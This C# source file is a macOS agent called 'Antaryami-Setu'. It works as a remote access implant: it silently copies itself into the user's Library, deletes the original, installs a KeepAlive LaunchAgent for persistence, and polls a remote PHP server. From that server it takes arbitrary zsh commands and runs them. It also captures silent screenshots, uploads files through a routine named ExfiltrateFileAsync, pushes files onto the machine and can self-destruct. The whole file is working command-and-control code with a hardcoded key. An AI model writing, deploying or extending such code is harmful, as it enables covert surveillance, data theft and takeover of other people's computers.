using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace AntaryamiSetuMacAgent
{
    class Program
    {
        // =========================================================
        // CONFIGURATION (Set to the same API URL as dashboard)
        // =========================================================
        private static string ApiUrl = "https://yourdomain.com/api/api_setu.php";
        private static string _deviceId = string.Empty;
        private static string _sessionToken = Guid.NewGuid().ToString();
        private static readonly HttpClient _httpClient = new HttpClient();
        private static readonly HttpClient _telemetryClient = new HttpClient();

        static async Task Main(string[] args)
        {
            Console.WriteLine("[*] Starting Antaryami-Setu macOS Online Agent...");
            PerformMacSelfInstallation(args);

            _httpClient.DefaultRequestHeaders.Add("X-API-KEY", _sessionToken);
            _telemetryClient.DefaultRequestHeaders.Add("X-API-KEY", "SetuAgentReg@2026");
            
            _deviceId = GetHardwareBoundIdentifier();
            Console.WriteLine($"[*] Device ID: {_deviceId}");
            Console.WriteLine($"[*] Targeting API: {ApiUrl}");

            // Register persistence on macOS startup
            RegisterMacStartup();

            var cts = new CancellationTokenSource();

            // Run telemetry loop and command fetch loop in parallel
            Task telemetryTask = TelemetryLoopAsync(cts.Token);
            Task fetchTask = ReceiveLoopAsync(cts.Token);

            await Task.WhenAll(telemetryTask, fetchTask);
        }

        private static void PerformMacSelfInstallation(string[] args)
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule?.FileName ?? Environment.ProcessPath ?? string.Empty;
                if (string.IsNullOrEmpty(currentPath)) return;

                // Skip installation for local debug runs
                if (currentPath.Contains("ANTARYAMI-SETU", StringComparison.OrdinalIgnoreCase) || 
                    currentPath.Contains("bin/Debug", StringComparison.OrdinalIgnoreCase) || 
                    currentPath.Contains("bin\\Debug", StringComparison.OrdinalIgnoreCase))
                {
                    return;
                }

                string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string targetDir = Path.Combine(homeDir, "Library", "Application Support", "AntaryamiSetuMacAgent");
                string exeName = Path.GetFileName(currentPath);
                string targetPath = Path.Combine(targetDir, exeName);

                // If running from the target path, skip installation
                if (string.Equals(currentPath, targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    return;
                }

                // Create folder if it doesn't exist
                if (!Directory.Exists(targetDir))
                {
                    Directory.CreateDirectory(targetDir);
                }

                // Copy executable to permanent path
                File.Copy(currentPath, targetPath, true);

                // Grant execute permissions to copied executable using chmod +x
                try
                {
                    using (var chmodProc = new Process())
                    {
                        chmodProc.StartInfo = new ProcessStartInfo
                        {
                            FileName = "/bin/chmod",
                            Arguments = $"+x \"{targetPath}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        chmodProc.Start();
                        chmodProc.WaitForExit(5000);
                    }
                }
                catch { }

                // Register LaunchAgent startup pointing to target path
                RegisterMacStartupPath(targetPath);

                // Spawn copied process in the background
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    UseShellExecute = true
                });

                // Spawn a shell script to delay, clean up the installer, and exit
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "/bin/sh",
                        Arguments = $"-c \"sleep 3 && rm -f \\\"{currentPath}\\\"\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                catch { }

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Self-installation failed: " + ex.Message);
            }
        }

        private static void RegisterMacStartup()
        {
            try
            {
                string? appPath = Process.GetCurrentProcess().MainModule?.FileName ?? Environment.ProcessPath;
                if (string.IsNullOrEmpty(appPath)) return;

                // Skip registering startup during local visual studio/debug runs
                if (appPath.Contains("ANTARYAMI-SETU", StringComparison.OrdinalIgnoreCase) || 
                    appPath.Contains("bin/Debug", StringComparison.OrdinalIgnoreCase) || 
                    appPath.Contains("bin\\Debug", StringComparison.OrdinalIgnoreCase))
                {
                    return;
                }

                // Verify we are running from the permanent path
                string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string targetDir = Path.Combine(homeDir, "Library", "Application Support", "AntaryamiSetuMacAgent");
                string targetPath = Path.Combine(targetDir, Path.GetFileName(appPath));

                if (!string.Equals(appPath, targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    return; // Skip writing plist, not in permanent folder yet
                }

                RegisterMacStartupPath(appPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to register LaunchAgent: " + ex.Message);
            }
        }

        private static void RegisterMacStartupPath(string appPath)
        {
            try
            {
                string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string launchAgentsDir = Path.Combine(homeDir, "Library", "LaunchAgents");
                string plistPath = Path.Combine(launchAgentsDir, "com.antaryami.maconlineagent.plist");

                if (!Directory.Exists(launchAgentsDir))
                {
                    Directory.CreateDirectory(launchAgentsDir);
                }

                string plistContent = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
    <key>Label</key>
    <string>com.antaryami.maconlineagent</string>
    <key>ProgramArguments</key>
    <array>
        <string>" + appPath + @"</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>";

                File.WriteAllText(plistPath, plistContent, Encoding.UTF8);
                Console.WriteLine("[*] Persistent LaunchAgent registered at: " + plistPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to write LaunchAgent plist: " + ex.Message);
            }
        }

        private static string GetHardwareBoundIdentifier()
        {
            try
            {
                // Generate a unique, stable hardware identifier for the macOS device
                string rawId = Environment.MachineName + Environment.UserName;
                using (var sha256 = SHA256.Create())
                {
                    byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(rawId));
                    return BitConverter.ToString(bytes).Replace("-", "").ToLower().Substring(0, 12) + "_SETU_MAC";
                }
            }
            catch
            {
                return "mac_fallback_id_SETU_MAC";
            }
        }

        private static async Task TelemetryLoopAsync(CancellationToken token)
        {
            Console.WriteLine("[*] Telemetry heartbeat loop started.");
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent("telemetry"), "action");
                    content.Add(new StringContent(_deviceId), "device_id");
                    content.Add(new StringContent(Environment.MachineName + " (" + Environment.UserName + ")"), "device_name");
                    content.Add(new StringContent(RuntimeInformation.OSDescription), "os_info");
                    content.Add(new StringContent("Active"), "active_app");
                    content.Add(new StringContent(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)), "current_path");
                    content.Add(new StringContent(_sessionToken), "session_token");

                    var response = await _telemetryClient.PostAsync(ApiUrl, content, token);
                    if (response.IsSuccessStatusCode)
                    {
                        string result = await response.Content.ReadAsStringAsync(token);
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Telemetry ping success: {result}");
                    }
                    else
                    {
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Telemetry ping failed: {response.StatusCode}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Telemetry loop error: {ex.Message}");
                }

                // Poll every 10 seconds (Admin marks offline if unseen for 30 seconds)
                await Task.Delay(10000, token);
            }
        }

        private static async Task ReceiveLoopAsync(CancellationToken token)
        {
            Console.WriteLine("[*] Command polling loop started.");
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var response = await _httpClient.GetStringAsync($"{ApiUrl}?action=fetch&device_id={_deviceId}", token);
                    if (!string.IsNullOrWhiteSpace(response) && response != "NO_COMMAND")
                    {
                        // Expected format from PHP: task_id|command
                        var parts = response.Split(new[] { '|' }, 2);
                        if (parts.Length == 2)
                        {
                            string taskId = parts[0];
                            string command = parts[1];
                            _ = Task.Run(() => ProcessCommandAsync(taskId, command, token), token);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Polling loop error: {ex.Message}");
                }

                // Poll every 5 seconds for commands
                await Task.Delay(5000, token);
            }
        }

        private static async Task ProcessCommandAsync(string taskId, string command, CancellationToken token)
        {
            string output = "";
            try
            {
                Console.WriteLine($"[*] Executing Command: {command}");

                if (command.StartsWith("speak ", StringComparison.OrdinalIgnoreCase))
                {
                    string textToSpeak = command.Substring(6).Trim();
                    SpeakOfflineText(textToSpeak);
                    output = $"[+] macOS client speaking initiated: \"{textToSpeak}\"";
                }
                else if (command.StartsWith("beep", StringComparison.OrdinalIgnoreCase))
                {
                    TriggerCustomBeep();
                    output = "[+] Beep played on macOS client.";
                }
                else if (command.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
                {
                    string targetPath = command.Substring(3).Trim();
                    // Resolve home folder shorthand (~) if specified
                    if (targetPath.StartsWith("~"))
                    {
                        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        targetPath = Path.Combine(home, targetPath.Substring(1).TrimStart('/', '\\'));
                    }
                    Directory.SetCurrentDirectory(targetPath);
                    output = $"[*] Context Directory: {Directory.GetCurrentDirectory()}";
                }
                else if (command.StartsWith("cat ", StringComparison.OrdinalIgnoreCase))
                {
                    string filePath = command.Substring(4).Trim();
                    if (filePath.StartsWith("~"))
                    {
                        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        filePath = Path.Combine(home, filePath.Substring(1).TrimStart('/', '\\'));
                    }
                    
                    if (File.Exists(filePath))
                    {
                        output = await File.ReadAllTextAsync(filePath, token);
                    }
                    else
                    {
                        output = $"[-] File not found: {filePath}";
                    }
                }
                else if (command.Equals("screenshot", StringComparison.OrdinalIgnoreCase))
                {
                    await CaptureScreenshotAsync(taskId, token);
                    return; // Return immediately since screenshot uploads directly
                }
                else if (command.StartsWith("pull ", StringComparison.OrdinalIgnoreCase))
                {
                    string targetFilePath = command.Substring(5).Trim();
                    if (targetFilePath.StartsWith("~"))
                    {
                        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        targetFilePath = Path.Combine(home, targetFilePath.Substring(1).TrimStart('/', '\\'));
                    }
                    await ExfiltrateFileAsync(taskId, targetFilePath, token);
                    return;
                }
                else if (command.StartsWith("push_file ", StringComparison.OrdinalIgnoreCase))
                {
                    string fileInfo = command.Substring(10).Trim();
                    var parts = fileInfo.Split('|');
                    if (parts.Length == 2)
                    {
                        string filename = parts[0];
                        string relativePath = parts[1];
                        await DownloadAndSaveFileAsync(taskId, filename, relativePath, token);
                        return;
                    }
                    else
                    {
                        output = "[-] Invalid push_file parameters.";
                    }
                }
                else if (command.StartsWith("alert ", StringComparison.OrdinalIgnoreCase))
                {
                    string alertMessage = command.Substring(6).Trim();
                    ShowFullscreenAlert(alertMessage);
                    output = $"[+] Alert warning displayed on macOS client: \"{alertMessage}\"";
                }
                else if (command.Equals("uninstall", StringComparison.OrdinalIgnoreCase))
                {
                    await PostOutputAsync(taskId, "[+] macOS Agent uninstallation initiated. Cleaning up and self-destructing.", token);
                    SelfDestruct();
                    return;
                }
                else
                {
                    // Run general commands using macOS native zsh shell
                    using var systemProcess = new Process();
                    systemProcess.StartInfo = new ProcessStartInfo
                    {
                        FileName = "/bin/zsh",
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    systemProcess.StartInfo.ArgumentList.Add("-c");
                    systemProcess.StartInfo.ArgumentList.Add(command);

                    using var ctsTimeout = new CancellationTokenSource(60000); // 60s timeout
                    using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(token, ctsTimeout.Token);

                    systemProcess.Start();

                    try
                    {
                        await systemProcess.WaitForExitAsync(linkedCts.Token);
                        string stdout = await systemProcess.StandardOutput.ReadToEndAsync(linkedCts.Token);
                        string stderr = await systemProcess.StandardError.ReadToEndAsync(linkedCts.Token);
                        
                        output = !string.IsNullOrEmpty(stdout) ? stdout : stderr;
                        if (string.IsNullOrEmpty(output)) output = "[*] Execution complete with empty output stream.";
                        output += $"\n\n[*] Context Directory: {Directory.GetCurrentDirectory()}";
                    }
                    catch (OperationCanceledException)
                    {
                        if (ctsTimeout.IsCancellationRequested)
                        {
                            try { systemProcess.Kill(true); } catch { }
                            output = "[-] Execution Timeout: Shell process forcefully terminated after 60 seconds.";
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                output = $"[-] Task abort exception: {ex.Message}";
            }

            if (!string.IsNullOrEmpty(output))
            {
                await PostOutputAsync(taskId, output, token);
            }
        }

        private static async Task PostOutputAsync(string taskId, string text, CancellationToken token)
        {
            try
            {
                var content = new MultipartFormDataContent();
                content.Add(new StringContent("post_output"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                content.Add(new StringContent(text), "output");
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch { }
        }

        private static void SpeakOfflineText(string message)
        {
            try
            {
                Task.Run(() =>
                {
                    using (var process = new Process())
                    {
                        process.StartInfo = new ProcessStartInfo
                        {
                            FileName = "/usr/bin/say",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        process.StartInfo.ArgumentList.Add(message);
                        process.Start();
                        process.WaitForExit(15000);
                    }
                });
            }
            catch { }
        }

        private static void TriggerCustomBeep()
        {
            try
            {
                // In macOS terminal environment, writing the bell character outputs standard alert audio beep
                Console.Write("\a");
            }
            catch { }
        }

        private static void ShowFullscreenAlert(string message)
        {
            try
            {
                Task.Run(() =>
                {
                    using (var process = new Process())
                    {
                        process.StartInfo = new ProcessStartInfo
                        {
                            FileName = "/usr/bin/osascript",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        
                        // AppleScript commands to show warning dialog
                        string appleScript = "display alert \"Antaryami-Setu Warning\" message \"" + message.Replace("\"", "\\\"") + "\" buttons {\"Dismiss\"} default button \"Dismiss\"";
                        process.StartInfo.ArgumentList.Add("-e");
                        process.StartInfo.ArgumentList.Add(appleScript);
                        
                        process.Start();
                        process.WaitForExit(60000);
                    }
                });
            }
            catch { }
        }

        private static async Task CaptureScreenshotAsync(string taskId, CancellationToken token)
        {
            string tempFile = $"/tmp/screenshot_{DateTime.Now:yyyyMMddHHmmss}.jpg";
            try
            {
                // Run macOS native 'screencapture' in silent mode (-x)
                using (var process = new Process())
                {
                    process.StartInfo = new ProcessStartInfo
                    {
                        FileName = "/usr/sbin/screencapture",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    process.StartInfo.ArgumentList.Add("-x");
                    process.StartInfo.ArgumentList.Add(tempFile);
                    
                    process.Start();
                    await process.WaitForExitAsync(token);
                }

                if (!File.Exists(tempFile))
                {
                    await PostOutputAsync(taskId, "[-] VISUAL_FAIL: macOS screenshot file not captured.", token);
                    return;
                }

                byte[] rawBytes = await File.ReadAllBytesAsync(tempFile, token);

                var content = new MultipartFormDataContent();
                content.Add(new StringContent("upload_screenshot"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                
                var imageContent = new ByteArrayContent(rawBytes);
                imageContent.Headers.Add("Content-Type", "image/jpeg");
                content.Add(imageContent, "file", Path.GetFileName(tempFile));
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] Screenshot creation failed: {ex.Message}", token);
            }
            finally
            {
                try
                {
                    if (File.Exists(tempFile))
                    {
                        File.Delete(tempFile);
                    }
                }
                catch { }
            }
        }

        private static async Task ExfiltrateFileAsync(string taskId, string filePath, CancellationToken token)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    await PostOutputAsync(taskId, $"[-] EXFIL_FAIL: File not found: {filePath}", token);
                    return;
                }

                FileInfo fileInfo = new FileInfo(filePath);
                if (fileInfo.Length > 52428800) // 50MB Size limit
                {
                    await PostOutputAsync(taskId, $"[-] EXFIL_FAIL: File size exceeds 50MB limit.", token);
                    return;
                }

                byte[] fileBytes = await File.ReadAllBytesAsync(filePath, token);
                string filename = Path.GetFileName(filePath);

                var content = new MultipartFormDataContent();
                content.Add(new StringContent("upload_file"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                
                var fileContent = new ByteArrayContent(fileBytes);
                content.Add(fileContent, "file", filename);
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] EXFIL_ERROR: {ex.Message}", token);
            }
        }

        private static async Task DownloadAndSaveFileAsync(string taskId, string filename, string relativePath, CancellationToken token)
        {
            try
            {
                string fileUrl = $"{ApiUrl}?action=download&file={relativePath}";
                byte[] fileBytes = await _httpClient.GetByteArrayAsync(fileUrl, token);
                
                string savePath = Path.Combine(Directory.GetCurrentDirectory(), filename);
                try 
                {
                    await File.WriteAllBytesAsync(savePath, fileBytes, token);
                } 
                catch (UnauthorizedAccessException) 
                {
                    savePath = Path.Combine(Path.GetTempPath(), filename);
                    await File.WriteAllBytesAsync(savePath, fileBytes, token);
                }
                
                await PostOutputAsync(taskId, $"[+] File received and saved: {savePath} ({fileBytes.Length / 1024.0:F2} KB)", token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] File receive error: {ex.Message}", token);
            }
        }

        private static void SelfDestruct()
        {
            try
            {
                // Clean up persistent LaunchAgent plist if it exists
                string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string plistPath = Path.Combine(homeDir, "Library", "LaunchAgents", "com.antaryami.maconlineagent.plist");
                if (File.Exists(plistPath))
                {
                    File.Delete(plistPath);
                }
            }
            catch { }

            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
                if (!string.IsNullOrEmpty(currentPath))
                {
                    string appBundlePath = string.Empty;
                    // Check if we are executing within a packaged .app bundle structure
                    if (currentPath.Contains(".app/Contents/MacOS/"))
                    {
                        int index = currentPath.IndexOf(".app/Contents/MacOS/");
                        appBundlePath = currentPath.Substring(0, index + 4);
                    }

                    string deleteTarget = !string.IsNullOrEmpty(appBundlePath) ? appBundlePath : currentPath;

                    // Delay for process closure then run cleanup
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "/bin/sh",
                        Arguments = $"-c \"sleep 3 && rm -rf \\\"{deleteTarget}\\\"\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
            }
            catch { }

            Environment.Exit(0);
        }
    }
}
